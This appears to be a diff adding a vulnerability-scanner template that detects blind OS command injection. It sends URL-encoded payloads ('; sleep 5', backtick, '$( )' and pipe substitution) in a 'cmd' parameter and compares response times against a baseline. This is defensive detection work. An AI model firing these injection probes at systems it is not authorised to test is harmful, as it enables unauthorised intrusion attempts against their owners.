@@ -1,0 +1,92 @@
+# gap: command-injection-time-blind
+id: command-injection-time-blind
+
+info:
+  name: OS Command Injection — Time-Based Blind Detection
+  author: TyrusRC
+  severity: high
+  description: |
+    Detects OS command injection by comparing the response duration of
+    a baseline request against a payload that injects a 5-second `sleep`
+    via the four canonical shell-metachar primitives (`;sleep 5`,
+    `` `sleep 5` ``, `$(sleep 5)`, `|sleep 5`). The DSL matcher fires
+    only when the baseline is fast (`duration_1 < 2`) AND at least
+    one payload completes significantly slower (`duration_N > 4`) —
+    the timing differential that confirms the parameter reaches a
+    shell sink.
+
+    Command injection grants arbitrary command execution under the
+    application's process identity — the highest-impact server-side
+    bug class. Time-based blind is the most reliable detection
+    primitive black-box because it does not require the application
+    to reflect command output, and the sleep-based timing oracle is
+    independent of OS-language / shell type. Unix `sleep` is
+    deliberately used (not `timeout` / `ping`) to keep the probe
+    portable. Class detection — keys on duration differential, not
+    vendor banner.
+
+    FP guard: the baseline-comparison + 4s sleep avoids natural
+    network jitter; intermittent latency on the target may still
+    trigger a single-shot match, so verify confirmed findings with
+    a second pass.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
+    - https://cwe.mitre.org/data/definitions/77.html
+    - https://cwe.mitre.org/data/definitions/78.html
+  tags: custom,vulnerabilities,command-injection,rce,owasp,cwe-78
+
+http:
+  - raw:
+      # Request 1: control baseline
+      - |+
+        GET /?cmd=ls&id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+
+      # Request 2: semicolon-separated sleep
+      - |+
+        GET /?cmd=ls%3Bsleep%205&id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+
+      # Request 3: backtick command substitution
+      - |+
+        GET /?cmd=%60sleep%205%60&id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+
+      # Request 4: $() command substitution
+      - |+
+        GET /?cmd=%24%28sleep%205%29&id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+
+      # Request 5: pipe to sleep
+      - |+
+        GET /?cmd=ls%7Csleep%205&id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+
+    unsafe: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          # Baseline must be fast (< 2 seconds)
+          - "duration_1 < 2"
+          # At least one payload variant must take significantly longer (> 4 seconds)
+          - "duration_2 > 4 || duration_3 > 4 || duration_4 > 4 || duration_5 > 4"
+          # All requests returned (not a timeout / connection reset)
+          - "status_code_1 > 0 && status_code_2 > 0"
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"Baseline duration (s): " + duration_1'
+          - '"Payload durations (s) — semicolon/backtick/dollar-paren/pipe: " + duration_2 + " / " + duration_3 + " / " + duration_4 + " / " + duration_5'
